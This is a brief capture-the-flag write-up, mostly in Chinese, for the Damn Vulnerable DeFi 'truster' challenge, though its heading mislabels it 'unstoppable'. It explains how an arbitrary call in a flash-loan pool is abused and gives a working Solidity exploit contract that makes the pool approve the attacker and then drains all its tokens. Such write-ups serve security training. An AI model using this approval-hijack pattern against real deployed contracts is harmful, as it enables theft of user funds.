# Damn Vulnerable DeFi v4 - unstoppable

- https://www.damnvulnerabledefi.xyz/challenges/truster/

## Check Condition

只能發送一筆交易：

```solidity
assertEq(vm.getNonce(player), 1, "Player executed more than one tx");
```

需要抽走 pool 的資金，並轉移至 recovery：

```solidity
assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");

assertEq(
    token.balanceOf(recovery),
    TOKENS_IN_POOL,
    "Not enough tokens in recovery account"
);
```

## Break

主要原因是 arbitrary call：

```solidity
target.functionCall(data);
```

可以利用來設定 token approval，之後就能將資金轉出

## Solution

```solidity
contract Trigger {
    constructor(
        DamnValuableToken token,
        TrusterLenderPool pool,
        address recovery
    ) {
        // arbitary call and set approval
        pool.flashLoan(
            0,
            address(this),
            address(token),
            abi.encodeCall(IERC20.approve, (address(this), type(uint256).max))
        );
        // drain pool
        token.transferFrom(address(pool), address(this), 1_000_000e18);
        // transfer to recovery
        token.transfer(recovery, 1_000_000e18);
    }
}

// hack
Trigger instance = new Trigger(token, pool, recovery);
```
